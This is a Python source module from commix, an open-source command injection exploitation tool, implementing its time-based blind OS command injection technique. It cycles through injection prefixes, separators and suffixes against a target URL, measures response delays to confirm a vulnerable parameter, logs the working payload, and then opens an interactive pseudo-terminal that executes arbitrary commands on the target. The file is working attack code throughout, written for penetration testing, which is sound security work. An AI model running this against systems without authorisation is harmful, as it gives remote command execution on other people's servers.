#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import string
import random
import urllib
import urllib2

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.blind_based.techniques.time_based import tb_injector
from src.core.injections.blind_based.techniques.time_based import tb_payloads
from src.core.injections.blind_based.techniques.time_based import tb_enumeration

"""
 The "time-based" injection technique on Blind OS Command Injection.
"""

#-------------------------------------------------
# The "time-based" injection technique handler.
#-------------------------------------------------
def tb_injection_handler(url,delay,filename,http_request_method):
  
  counter = 0
  vp_flag = True
  no_result = True
  is_encoded= False
  injection_type = "Blind-based Command Injection"
  technique = "time-based injection technique"
  
  # Print the findings to log file.
  output_file = open(filename + ".txt", "a")
  output_file.write("\n---")
  output_file.write("\n(+) Type : " + injection_type)
  output_file.write("\n(+) Technique : " + technique.title())
  output_file.close()
    
  # Check if defined "--maxlen" option.
  if menu.options.maxlen:
    maxlen = menu.options.maxlen
    
  # Check if defined "--url-reload" option.
  if menu.options.url_reload == True:
    print colors.BGRED + "(x) Error: The '--url-reload' option is not available in "+ technique +"!" + colors.RESET

  sys.stdout.write( colors.BOLD + "(*) Testing the "+ technique + "... " + colors.RESET)
  sys.stdout.flush()
  
  for prefix in settings.PREFIXES:
    for suffix in settings.SUFFIXES:
      for separator in settings.SEPARATORS:

	# Check for bad combination of prefix and separator
	combination = prefix + separator
	if combination in settings.JUNK_COMBINATION:
	  prefix = ""
	
	# Change TAG on every request to prevent false-positive resutls.
	TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
	tag_length = len(TAG) + 4
	
	for j in range(1,int(tag_length)):
	  try:
	    # Time-based decision payload (check if host is vulnerable).
	    payload = tb_payloads.decision(separator,TAG,j,delay,http_request_method)
	    
	    # Check if defined "--prefix" option.
	    if menu.options.prefix:
	      prefix = menu.options.prefix
	      payload = prefix + payload
	    else:
	      payload = prefix + payload

	    # Check if defined "--suffix" option.
	    if menu.options.suffix:
	      suffix = menu.options.suffix
	      payload = payload + suffix
	    else:
	      payload = payload + suffix
	      
	    # Check if defined "--verbose" option.
	    if menu.options.verbose:
	      if separator == ";" or separator == "&&" or separator == "||":
		sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
		
	    # Check if target host is vulnerable.
	    how_long,vuln_parameter = tb_injector.injection_test(payload,http_request_method,url)

	  except:
	    continue
	  
	  # Yaw, got shellz! 
	  # Do some magic tricks!
	  if how_long == delay:
	    found = True
	    no_result = False
	    
	    if http_request_method == "GET":
	      # Print the findings to log file
	      if vp_flag == True:
		output_file = open(filename + ".txt", "a")
		output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
		output_file.write("\n---\n")
		vp_flag = False
		output_file.close()
		
	      counter = counter + 1
	      output_file = open(filename + ".txt", "a")
	      output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
	      output_file.close()
		
	      # Print the findings to terminal.
	      print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + vuln_parameter +"' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
	      print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
	      print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
	      print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
	      print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", urllib.unquote_plus(payload)) + colors.RESET
		
	    else :
	      # Print the findings to log file
	      if vp_flag == True:
		output_file = open(filename + ".txt", "a")
		output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
		output_file.write("\n---\n")
		vp_flag = False
		output_file.close()
		
	      counter = counter + 1
	      output_file = open(filename + ".txt", "a")
	      output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
	      output_file.close()
		
	      # Print the findings to terminal.
	      print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + vuln_parameter +"' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
	      print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
	      print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
	      print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
	      print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload) + colors.RESET + "\n"
	      
	    # Check for any enumeration options.
	    tb_enumeration.do_check(separator,maxlen,TAG,prefix,suffix,delay,http_request_method,url,vuln_parameter)
	    
	    # Pseudo-Terminal shell
	    gotshell = raw_input("\n(*) Do you want a Pseudo-Terminal shell? [Y/n] > ")
	    if gotshell == "Y" or gotshell == "y":
	      print ""
	      print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
	      while True:
		try:
		  cmd = raw_input("Shell > ")
		  if cmd == "q":
		    sys.exit(0)
		    
		  else:
		    # The main command injection exploitation.
		    check_how_long,output  = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter)
		    
		    if menu.options.verbose:
		      print ""
		    print "\n\n" + colors.GREEN + colors.BOLD + output + colors.RESET
		    print "\n(*) Finished in "+ time.strftime('%H:%M:%S', time.gmtime(check_how_long)) +".\n"
		    
		except KeyboardInterrupt: 
		  print ""
		  sys.exit(0)

	    else:
	      print "(*) Continue testing the "+ technique +"... "
	      break
	  
  if no_result == True:
    if menu.options.verbose == False:
      print "[" + colors.RED + " FAILED "+colors.RESET+"]"
      return False
  
    else:
      print ""
      return False
  
  else :
    print ""
    
    
def exploitation(url,delay,filename,http_request_method):
    tb_injection_handler(url,delay,filename,http_request_method)